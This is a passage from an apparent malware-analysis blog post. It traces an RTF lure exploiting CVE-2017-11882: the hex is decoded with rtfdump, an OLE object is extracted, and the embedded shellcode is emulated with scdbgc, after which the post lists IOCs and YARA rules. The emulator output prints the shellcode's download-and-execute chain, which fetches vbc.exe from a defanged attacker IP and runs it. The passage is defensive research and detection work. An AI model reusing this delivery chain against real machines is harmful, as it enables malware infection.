</span></span><span class=line><span class=cl>000004D0: 0F <span class=m>26</span> 9F <span class=m>51</span> 6A 7D <span class=m>80</span> <span class=m>10</span>  <span class=m>30</span> <span class=m>00</span> <span class=m>00</span> <span class=m>08</span> <span class=m>00</span> <span class=m>50</span> <span class=m>00</span> <span class=m>00</span>  .<span class=p>&amp;</span>.Qj<span class=o>}</span>..0....P..
</span></span><span class=line><span class=cl>000004E0: <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>10</span> <span class=m>04</span> F0 <span class=m>06</span>  C0 <span class=m>04</span> <span class=m>50</span> <span class=m>03</span> <span class=m>10</span> <span class=m>03</span> <span class=m>00</span> <span class=m>06</span>  ..........P.....
</span></span><span class=line><span class=cl>000004F0: E0 <span class=m>06</span> <span class=m>10</span> <span class=m>05</span> <span class=m>40</span> <span class=m>06</span> <span class=m>90</span> <span class=m>05</span>  <span class=m>60</span> <span class=m>06</span> <span class=m>50</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span>  ....@...<span class=sb>`</span>.P.....
</span></span><span class=line><span class=cl>&lt;/snip&gt;
</span></span></code></pre></div><p>I want to focus on the following lines, executing this command just showed a bunch of blob, nothing is readable, and left me going back to rtfdump&rsquo;s documents trying to figure out why it can&rsquo;t properly decode these hex values.</p><p>The word <code>hexshift</code> caught my eye, the parameter in rtfdump is <code>--hexshift shift one nibble</code>, which made so much sense, let&rsquo;s execute the same command with the hexshift and look at the output and also draw it out:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ rtfdump.py -s3 -S -H doc_50.doc
</span></span><span class=line><span class=cl>&lt;snip&gt;
</span></span><span class=line><span class=cl>00000460: FF FF FF FF <span class=m>52</span> <span class=m>00</span> 6F <span class=m>00</span>  6F <span class=m>00</span> <span class=m>74</span> <span class=m>00</span> <span class=m>20</span> <span class=m>00</span> <span class=m>45</span> <span class=m>00</span>  ....R.o.o.t. .E.
</span></span><span class=line><span class=cl>00000470: 6E <span class=m>00</span> <span class=m>74</span> <span class=m>00</span> <span class=m>72</span> <span class=m>00</span> <span class=m>79</span> <span class=m>00</span>  <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span>  n.t.r.y.........
</span></span><span class=line><span class=cl>00000480: <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span>  <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span>  ................
</span></span><span class=line><span class=cl>00000490: <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span>  <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span>  ................
</span></span><span class=line><span class=cl>000004A0: <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>16</span> <span class=m>00</span> <span class=m>05</span> <span class=m>00</span>  FF FF FF FF FF FF FF FF  ................
</span></span><span class=line><span class=cl>000004B0: <span class=m>01</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>02</span> CE <span class=m>02</span> <span class=m>00</span>  <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> C0 <span class=m>00</span> <span class=m>00</span> <span class=m>00</span>  ................
</span></span><span class=line><span class=cl>000004C0: <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>46</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span>  <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span>  ...F............
</span></span><span class=line><span class=cl>000004D0: <span class=m>70</span> F2 <span class=m>69</span> F5 <span class=m>16</span> A7 D8 <span class=m>01</span>  <span class=m>03</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>80</span> <span class=m>05</span> <span class=m>00</span> <span class=m>00</span>  p.i.............
</span></span><span class=line><span class=cl>000004E0: <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>01</span> <span class=m>00</span> 4F <span class=m>00</span>  6C <span class=m>00</span> <span class=m>45</span> <span class=m>00</span> <span class=m>31</span> <span class=m>00</span> <span class=m>30</span> <span class=m>00</span>  ......O.l.E.1.0.
</span></span><span class=line><span class=cl>000004F0: 6E <span class=m>00</span> <span class=m>61</span> <span class=m>00</span> <span class=m>54</span> <span class=m>00</span> <span class=m>69</span> <span class=m>00</span>  <span class=m>56</span> <span class=m>00</span> <span class=m>65</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span>  n.a.T.i.V.e.....
</span></span><span class=line><span class=cl>&lt;/snip&gt;
</span></span></code></pre></div><p>We actually have something readable.</p><h3 id=so-what-does-shift-one-nibble-mean>So what does shift one nibble mean?<a href=#so-what-does-shift-one-nibble-mean class=anchor aria-hidden=true><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h3><pre tabindex=0><code class=language-hex data-lang=hex>00000460: FF FF FF F5 20 06 F0 06  F0 07 40 02 00 04 50 06  .... .....@...P.
                    | 
                     _ &lt; Shift one nibble to the left
                      |
00000460: FF FF FF FF 52 00 6F 00  6F 00 74 00 20 00 45 00  ....R.o.o.t. .E.
</code></pre><p>So with the nibble shifting in play, let&rsquo;s dump that section and also dump it in raw format using the <code>-d</code> parameter:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ rtfdump.py -s3 -S -H doc_50.doc -d &gt; s3_doc_50.dump
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ oledump.py s3_doc_50.dump
</span></span><span class=line><span class=cl>Error: s3_doc_50.dump is not a valid OLE file.
</span></span></code></pre></div><h3 id=why-is-that>Why is that?<a href=#why-is-that class=anchor aria-hidden=true><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h3><p>Let&rsquo;s go back to the dump:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ rtfdump.py -s3 -S -H doc_50.doc
</span></span><span class=line><span class=cl>&lt;snip&gt;
</span></span><span class=line><span class=cl>00000060: <span class=m>00</span> 0E <span class=m>00</span> <span class=m>00</span> D0 CF <span class=m>11</span> E0  A1 B1 1A E1 <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span>  ................
</span></span><span class=line><span class=cl>&lt;/snip&gt;
</span></span></code></pre></div><p>the bytes <code>D0 CF 11 E0</code> (remember these magic bytes when analyzing documents) match the signature of a valid <a href=https://en.wikipedia.org/wiki/List_of_file_signatures>OLE file</a>, well, Compound File Binary Format to be more accurate.</p><p>To extract from the COM object header onward, we can do the following:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ rtfdump.py -s3 -S -H doc_50.doc -c 0x64: <span class=p>|</span> head -n3
</span></span><span class=line><span class=cl>00000000: D0 CF <span class=m>11</span> E0 A1 B1 1A E1  <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span>  ................
</span></span><span class=line><span class=cl>00000010: <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span>  3E <span class=m>00</span> <span class=m>03</span> <span class=m>00</span> FE FF <span class=m>09</span> <span class=m>00</span>  ........&gt;.......
</span></span><span class=line><span class=cl>00000020: <span class=m>06</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span>  <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>01</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span>  ................
</span></span><span class=line><span class=cl>$ rtfdump.py -s3 -S -H doc_50.doc -c 0x64: -d &gt; s3_doc_50.dump
</span></span><span class=line><span class=cl>$ oledump.py s3_doc_50.dump
</span></span><span class=line><span class=cl>  1:      <span class=m>1354</span> <span class=s1>&#39;\x01OlE10naTiVe&#39;</span>
</span></span></code></pre></div><h3 id=another-way-to-obtain-this-with-oledump>Another way to obtain this with oledump<a href=#another-way-to-obtain-this-with-oledump class=anchor aria-hidden=true><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ rtfdump.py -s3 -S -H doc_50.doc -d &gt; s3_doc_50.dump
</span></span><span class=line><span class=cl>$ oledump.py --find<span class=o>=</span><span class=m>1</span> s3_doc_50.dump
</span></span><span class=line><span class=cl>  1:      <span class=m>1354</span> <span class=s1>&#39;\x01OlE10naTiVe&#39;</span>
</span></span><span class=line><span class=cl>$ oledump.py --find<span class=o>=</span><span class=m>1</span> s3_doc_50.dump -sa <span class=p>|</span> head -n3
</span></span><span class=line><span class=cl>00000000: <span class=m>32</span> C7 FD <span class=m>04</span> <span class=m>02</span> CB 4B BD  <span class=m>52</span> 0B <span class=m>01</span> <span class=m>08</span> 7F <span class=m>95</span> BD D6  2.....K.R.......
</span></span><span class=line><span class=cl>00000010: <span class=m>42</span> BA FF F7 D5 8B 7D <span class=m>13</span>  8B 0F BB <span class=m>30</span> E0 4F <span class=m>90</span> <span class=m>81</span>  B.....<span class=o>}</span>....0.O..
</span></span><span class=line><span class=cl>00000020: EB <span class=m>80</span> <span class=m>78</span> <span class=m>09</span> <span class=m>90</span> 8B <span class=m>03</span> <span class=m>51</span>  FF D0 <span class=m>05</span> <span class=m>62</span> 0B 0E FA 2D  ..x....Q...b...-
</span></span><span class=line><span class=cl>$ oledump.py --find<span class=o>=</span><span class=m>1</span> s3_doc_50.dump -sa -d &gt; raw_oleobj.dump
</span></span></code></pre></div><p>I was about to mention that LokiBot makes use of <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11882">CVE-2017-11882</a>, but there is another tool from oletools called <a href=https://github.com/decalage2/oletools/wiki/oledir>oledir</a>, which displays all the directory entries of an OLE file. However this CLSID <code>0002CE02-0000-0000-C000-000000000046</code> is a clear giveaway of this CVE being at play here.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ oledir s3_doc_50.dump
</span></span><span class=line><span class=cl>oledir 0.54 - http://decalage.info/python/oletools
</span></span><span class=line><span class=cl>OLE directory entries in file s3_doc_50.dump:
</span></span><span class=line><span class=cl>----+------+-------+----------------------+-----+-----+-----+--------+------
</span></span><span class=line><span class=cl>id  <span class=p>|</span>Status<span class=p>|</span>Type   <span class=p>|</span>Name                  <span class=p>|</span>Left <span class=p>|</span>Right<span class=p>|</span>Child<span class=p>|</span>1st Sect<span class=p>|</span>Size
</span></span><span class=line><span class=cl>----+------+-------+----------------------+-----+-----+-----+--------+------
</span></span><span class=line><span class=cl><span class=m>0</span>   <span class=p>|</span>&lt;Used&gt;<span class=p>|</span>Root   <span class=p>|</span>Root Entry            <span class=p>|</span>-    <span class=p>|</span>-    <span class=p>|</span><span class=m>1</span>    <span class=p>|</span><span class=m>3</span>       <span class=p>|</span><span class=m>1408</span>
</span></span><span class=line><span class=cl><span class=m>1</span>   <span class=p>|</span>&lt;Used&gt;<span class=p>|</span>Stream <span class=p>|</span><span class=se>\x</span>01OlE10naTiVe       <span class=p>|</span>-    <span class=p>|</span>-    <span class=p>|</span>-    <span class=p>|</span><span class=m>0</span>       <span class=p>|</span><span class=m>1354</span>
</span></span><span class=line><span class=cl><span class=m>2</span>   <span class=p>|</span>unused<span class=p>|</span>Empty  <span class=p>|</span>                      <span class=p>|</span>-    <span class=p>|</span>-    <span class=p>|</span>-    <span class=p>|</span><span class=m>0</span>       <span class=p>|</span><span class=m>0</span>
</span></span><span class=line><span class=cl><span class=m>3</span>   <span class=p>|</span>unused<span class=p>|</span>Empty  <span class=p>|</span>                      <span class=p>|</span>-    <span class=p>|</span>-    <span class=p>|</span>-    <span class=p>|</span><span class=m>0</span>       <span class=p>|</span><span class=m>0</span>
</span></span><span class=line><span class=cl>----+----------------------------+------+--------------------------------------
</span></span><span class=line><span class=cl>id  <span class=p>|</span>Name                        <span class=p>|</span>Size  <span class=p>|</span>CLSID
</span></span><span class=line><span class=cl>----+----------------------------+------+--------------------------------------
</span></span><span class=line><span class=cl><span class=m>0</span>   <span class=p>|</span>Root Entry                  <span class=p>|</span>-     <span class=p>|</span>0002CE02-0000-0000-C000-000000000046
</span></span><span class=line><span class=cl>    <span class=p>|</span>                            <span class=p>|</span>      <span class=p>|</span>Microsoft Equation 3.0 <span class=o>(</span>Known Related
</span></span><span class=line><span class=cl>    <span class=p>|</span>                            <span class=p>|</span>      <span class=p>|</span>to CVE-2017-11882 or CVE-2018-0802<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=m>1</span>   <span class=p>|</span><span class=se>\x</span>01OlE10naTiVe             <span class=p>|</span><span class=m>1354</span>  <span class=p>|</span>
</span></span></code></pre></div><h2 id=detecting-the-shellcode>Detecting the shellcode<a href=#detecting-the-shellcode class=anchor aria-hidden=true><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h2><p>For doing this let&rsquo;s make use of a tool called <a href="http://sandsprite.com/blogs/index.php?uid=7&pid=152">scdbgc</a>, a brief explanation of that the tool is:</p><blockquote><p>scdbg is a shellcode analysis application built around the libemu emulation library.</p></blockquote><p>Basically it analyzes shellcode by emulating its execution. You have 2 versions of this tool, scdbgc is the commandline equivalent of scdbg.</p><p>So we will use 2 parameters with scdbgc:</p><pre tabindex=0><code>/f fpath  load shellcode from file - accepts binary, %u, \x, %x, hex blob
/findsc   detect possible shellcode buffers (brute force) (supports -dump, -disasm)
</code></pre><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ scdbgc /f s3_doc_50.dump -findsc
</span></span><span class=line><span class=cl>Loaded e08 bytes from file s3_doc_50.dump
</span></span><span class=line><span class=cl>Testing <span class=m>3592</span> offsets  <span class=p>|</span>  Percent Complete: 99%  <span class=p>|</span>  Completed in <span class=m>1014</span> ms
</span></span><span class=line><span class=cl>0<span class=o>)</span> <span class=nv>offset</span><span class=o>=</span>0x8a5        <span class=nv>steps</span><span class=o>=</span>MAX    <span class=nv>final_eip</span><span class=o>=</span>7c80ae40   GetProcAddress
</span></span><span class=line><span class=cl>1<span class=o>)</span> <span class=nv>offset</span><span class=o>=</span>0x925        <span class=nv>steps</span><span class=o>=</span>MAX    <span class=nv>final_eip</span><span class=o>=</span>7c80ae40   GetProcAddress
</span></span><span class=line><span class=cl>2<span class=o>)</span> <span class=nv>offset</span><span class=o>=</span>0xaf9        <span class=nv>steps</span><span class=o>=</span>MAX    <span class=nv>final_eip</span><span class=o>=</span>401b0b
</span></span><span class=line><span class=cl>3<span class=o>)</span> <span class=nv>offset</span><span class=o>=</span>0xafb        <span class=nv>steps</span><span class=o>=</span>MAX    <span class=nv>final_eip</span><span class=o>=</span>401b0b
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Select index to execute:: <span class=o>(</span>int/reg<span class=o>)</span> <span class=m>0</span>
</span></span><span class=line><span class=cl><span class=m>0</span>
</span></span><span class=line><span class=cl>Loaded e08 bytes from file s3_doc_50.dump
</span></span><span class=line><span class=cl>Initialization Complete..
</span></span><span class=line><span class=cl>Max Steps: <span class=m>2000000</span>
</span></span><span class=line><span class=cl>Using base offset: 0x401000
</span></span><span class=line><span class=cl>Execution starts at file offset 8a5
</span></span><span class=line><span class=cl>4018a5	EB7E                            jmp 0x401925  vv
</span></span><span class=line><span class=cl>4018a7	8D9397020000                    lea edx,<span class=o>[</span>ebx+0x297<span class=o>]</span>
</span></span><span class=line><span class=cl>4018ad	6BF600                          imul esi,esi,0x0
</span></span><span class=line><span class=cl>4018b0	<span class=m>90</span>                              nop
</span></span><span class=line><span class=cl>4018b1	EB08                            jmp 0x4018bb  vv
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>401b2f	GetProcAddress<span class=o>(</span>ExpandEnvironmentStringsW<span class=o>)</span>
</span></span><span class=line><span class=cl>401b62	ExpandEnvironmentStringsW<span class=o>(</span>%PUBLIC%<span class=se>\v</span>bc.exe, <span class=nv>dst</span><span class=o>=</span>12fb9c, <span class=nv>sz</span><span class=o>=</span>104<span class=o>)</span>
</span></span><span class=line><span class=cl>401b77	LoadLibraryW<span class=o>(</span>UrlMon<span class=o>)</span>
</span></span><span class=line><span class=cl>401b92	GetProcAddress<span class=o>(</span>URLDownloadToFileW<span class=o>)</span>
</span></span><span class=line><span class=cl>401be4	URLDownloadToFileW<span class=o>(</span>hxxp://192<span class=o>[</span>.<span class=o>]</span>3<span class=o>[</span>.<span class=o>]</span>122<span class=o>[</span>.<span class=o>]</span>162/57/vbc.exe, C:<span class=se>\u</span>sers<span class=se>\P</span>ublic<span class=se>\v</span>bc.exe<span class=o>)</span>
</span></span><span class=line><span class=cl>401c2c	LoadLibraryW<span class=o>(</span>shell32<span class=o>)</span>
</span></span><span class=line><span class=cl>401c44	GetProcAddress<span class=o>(</span>ShellExecuteExW<span class=o>)</span>
</span></span><span class=line><span class=cl>401c4c	unhooked call to shell32.ShellExecuteExW	<span class=nv>step</span><span class=o>=</span><span class=m>45299</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Stepcount <span class=m>45299</span>
</span></span></code></pre></div><p>So let&rsquo;s break down what happened here, thanks to the tool doing most of the hard work here:</p><ol><li>We loaded the shellcode from the dump file</li><li>We used the <code>/findsc</code> parameter to detect possible shellcode buffers.</li><li>The <code>/findsc</code> parameter is a brute force search for shellcode buffers.</li><li>It lists all possible shellcode buffers and their offsets.</li><li>We selected the first one, which is the one we want because the tool is nice enough to say it has an opcode relevant to <code>GetProcAddress</code></li><li>Selected and, and scdbgc loaded the shellcode and emulated it&rsquo;s execution which gave us the URL we were after.</li></ol><p>If you know the offset you can simply supply it with the <code>/foff</code> to specify the offset:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ scdbgc /f s3_doc_50.dump -foff 0x8a5
</span></span><span class=line><span class=cl>&lt;snip&gt;
</span></span><span class=line><span class=cl>4018a5	EB7E                            jmp 0x401925  vv
</span></span><span class=line><span class=cl>4018a7	8D9397020000                    lea edx,<span class=o>[</span>ebx+0x297<span class=o>]</span>
</span></span><span class=line><span class=cl>4018ad	6BF600                          imul esi,esi,0x0
</span></span><span class=line><span class=cl>4018b0	<span class=m>90</span>                              nop
</span></span><span class=line><span class=cl>4018b1	EB08                            jmp 0x4018bb  vv
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>401b2f	GetProcAddress<span class=o>(</span>ExpandEnvironmentStringsW<span class=o>)</span>
</span></span><span class=line><span class=cl>401b62	ExpandEnvironmentStringsW<span class=o>(</span>%PUBLIC%<span class=se>\v</span>bc.exe, <span class=nv>dst</span><span class=o>=</span>12fb9c, <span class=nv>sz</span><span class=o>=</span>104<span class=o>)</span>
</span></span><span class=line><span class=cl>401b77	LoadLibraryW<span class=o>(</span>UrlMon<span class=o>)</span>
</span></span><span class=line><span class=cl>401b92	GetProcAddress<span class=o>(</span>URLDownloadToFileW<span class=o>)</span>
</span></span><span class=line><span class=cl>401be4	URLDownloadToFileW<span class=o>(</span>hxxp://192<span class=o>[</span>.<span class=o>]</span>3<span class=o>[</span>.<span class=o>]</span>122<span class=o>[</span>.<span class=o>]</span>162/57/vbc.exe, %PUBLIC%<span class=se>\v</span>bc.exe<span class=o>)</span>
</span></span><span class=line><span class=cl>401c2c	LoadLibraryW<span class=o>(</span>shell32<span class=o>)</span>
</span></span><span class=line><span class=cl>401c44	GetProcAddress<span class=o>(</span>ShellExecuteExW<span class=o>)</span>
</span></span><span class=line><span class=cl>401c4c	unhooked call to shell32.ShellExecuteExW	<span class=nv>step</span><span class=o>=</span><span class=m>45299</span>
</span></span><span class=line><span class=cl>&lt;/snip&gt;
</span></span></code></pre></div><h2 id=step-4-diving-into-lokibot-vpcexe>Step 4. Diving into LokiBot (vpc.exe)<a href=#step-4-diving-into-lokibot-vpcexe class=anchor aria-hidden=true><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h2><p>I&rsquo;ll cover this in more detail in the future, as this part was pretty lengthy, I found several different types of malware being deployed from the same source. (e.g. Formbook, LokiBot, etc)</p><p>But not to leave anyone hanging, here is a little tool from FireEye called (CAPA)[https://github.com/mandiant/capa], it detects capabilities in executable files or even shellcode.</p><pre tabindex=0><code>$ capa vbc.exe
+------------------------+------------------------------------------------------------------------------------+
| md5                    | e31ec73d7d7dfa46d8389c1f0b3c92ae                                                   |
| sha1                   | 9ae8bcc139898d5a31c5fb966ab05eaf65504401                                           |
| sha256                 | e736ecdc420334831835e97a58ef4d512be477f6c9803e17caae4e47381e0991                   |
| os                     | windows                                                                            |
| format                 | pe                                                                                 |
| arch                   | i386                                                                               |
| path                   | vbc.exe                                                                            |
+------------------------+------------------------------------------------------------------------------------+

+------------------------+------------------------------------------------------------------------------------+
| ATT&amp;CK Tactic          | ATT&amp;CK Technique                                                                   |
|------------------------+------------------------------------------------------------------------------------|
| DEFENSE EVASION        | Reflective Code Loading T1620                                                      |
| DISCOVERY              | System Location Discovery T1614                                                    |
+------------------------+------------------------------------------------------------------------------------+


+------------------------------------------------------+------------------------------------------------------+
| CAPABILITY                                           | NAMESPACE                                            |
|------------------------------------------------------+------------------------------------------------------|
| get geographical location                            | collection                                           |
| load .NET assembly                                   | load-code/dotnet                                     |
| unmanaged call                                       | runtime                                              |
| compiled to the .NET platform                        | runtime/dotnet                                       |
+------------------------------------------------------+------------------------------------------------------+
</code></pre><h2 id=step-5-lets-build-some-automated-detection>Step 5. Let&rsquo;s build some automated detection<a href=#step-5-lets-build-some-automated-detection class=anchor aria-hidden=true><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h2><h3 id=ioc>IOC<a href=#ioc class=anchor aria-hidden=true><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h3><table><thead><tr><th>Indicator</th><th>Type</th></tr></thead><tbody><tr><td>vbc.exe</td><td>Filename</td></tr><tr><td>shp_58.doc</td><td>Filename</td></tr><tr><td>shp_57.doc</td><td>Filename</td></tr><tr><td>14a477e0c37e60760bb806304fcdf37b</td><td>MD5</td></tr><tr><td>1cb3e5b0031ef252187c1615c3f7e8db</td><td>MD5</td></tr><tr><td>4d52c7446dda5cb8eb465d1902fa4fc3</td><td>MD5</td></tr><tr><td>89a8308ac9c48817acce539db7e1b45f</td><td>MD5</td></tr><tr><td>add40f2ec9ffce439f8e35e3bc1509cf</td><td>MD5</td></tr><tr><td>e31ec73d7d7dfa46d8389c1f0b3c92ae</td><td>MD5</td></tr><tr><td>12c635ac85b1ced4805c4bc679cf18a169d33619</td><td>SHA1</td></tr><tr><td>475fd526221b1731323fc5c9a732f2d87329ec89</td><td>SHA1</td></tr><tr><td>7cfa51cec50f5eaebc12bdf7b0c2b066f021edba</td><td>SHA1</td></tr><tr><td>9ae8bcc139898d5a31c5fb966ab05eaf65504401</td><td>SHA1</td></tr><tr><td>c8b45087429c162b0cc514fae47bb3f871c1c61f</td><td>SHA1</td></tr><tr><td>cc8958899f6433a6e5e8124901ecccc5fb838012</td><td>SHA1</td></tr><tr><td>3074b2ea06a803ab002e0bee1adc9b08dd62731563e3026b5db226367b7a44ab</td><td>SHA256</td></tr><tr><td>890c61f9b56ab414f1729bfba7aa223cc1439c0c23778432807ce13c39250ef0</td><td>SHA256</td></tr><tr><td>8fd93f5dc3041c50e1a6910aae03f95a22e632952ec987447859bec00bd31fa2</td><td>SHA256</td></tr><tr><td>be7dcfaf22adad3a7bc430046446d6a76e55ca1e00266e41710e7185f751da26</td><td>SHA256</td></tr><tr><td>d82d9f74c7d1b768a2c170b47117222fdf81a2aaae69ac2c61e893e94524c424</td><td>SHA256</td></tr><tr><td>e736ecdc420334831835e97a58ef4d512be477f6c9803e17caae4e47381e0991</td><td>SHA256</td></tr><tr><td>hxxp://192[.]3[.]122[.]162/57/vbc[.]exe</td><td>URL</td></tr><tr><td>hxxp://192[.]3[.]122[.]162/ships/shp_58[.]doc</td><td>URL</td></tr><tr><td>hxxp://192[.]3[.]122[.]162/ships/shp_57[.]doc</td><td>URL</td></tr><tr><td>hxxp://192[.]3[.]122[.]162/58/vbc[.]exe</td><td>UR</td></tr></tbody></table><h3 id=yara-rules>Yara Rules<a href=#yara-rules class=anchor aria-hidden=true><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h3><p>I thought I&rsquo;ll do something different a try, I&rsquo;ve always thought about automated YARA rule generation and how feasible it can be in this field, I found this amazing tool on Github called <a href=https://github.com/Neo23x0/yarGen>yarGen</a>, basically you give it the stuff you want YARA rules generated for and it does some magic. Here is a summary from the developer:</p><blockquote><p>The main principle is the creation of yara rules from strings found in malware files while removing all strings that also appear in goodware files. Therefore yarGen includes a big goodware strings and opcode database as ZIP archives that have to be extracted before the first use.</p></blockquote><p>Quick installation:</p><pre tabindex=0><code>git clone https://github.com/Neo23x0/yarGen.git
pip install -r requirements.txt
python3 yarGen.py --update
</code></pre><p>Let&rsquo;s look at the results:</p><pre tabindex=0><code>$ python3 yarGen.py --opcodes -m ~/files
&lt;snip&gt;
[+] Processing PEStudio strings ...
[+] Reading goodware strings from database &#39;good-strings.db&#39; ...
&lt;snip&gt;
[+] Generating Super Rules ...
[=] Generated 11 SIMPLE rules.
[=] Generated 7 SUPER rules.
[=] All rules written to yargen_rules.yar
[+] yarGen run finished
&lt;/snip&gt;
</code></pre><p>I must say the results are pretty good, it even combines multiple files of the same type to create one big rule if you desire, here is an example of one of the rules:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>rule _vbc_vbc_22_vbc_57_vbc_58_0 <span class=o>{</span>
</span></span><span class=line><span class=cl>   meta:
</span></span><span class=line><span class=cl>      <span class=nv>description</span> <span class=o>=</span> <span class=s2>&#34;raw_files - from files vbc.exe, vbc_22.exe, vbc_57.exe, vbc_58.exe&#34;</span>
</span></span><span class=line><span class=cl>      <span class=nv>author</span> <span class=o>=</span> <span class=s2>&#34;yarGen Rule Generator&#34;</span>
</span></span><span class=line><span class=cl>      <span class=nv>reference</span> <span class=o>=</span> <span class=s2>&#34;https://github.com/Neo23x0/yarGen&#34;</span>
</span></span><span class=line><span class=cl>      <span class=nv>date</span> <span class=o>=</span> <span class=s2>&#34;2022-08-05&#34;</span>
</span></span><span class=line><span class=cl>      <span class=nv>hash1</span> <span class=o>=</span> <span class=s2>&#34;e736ecdc420334831835e97a58ef4d512be477f6c9803e17caae4e47381e0991&#34;</span>
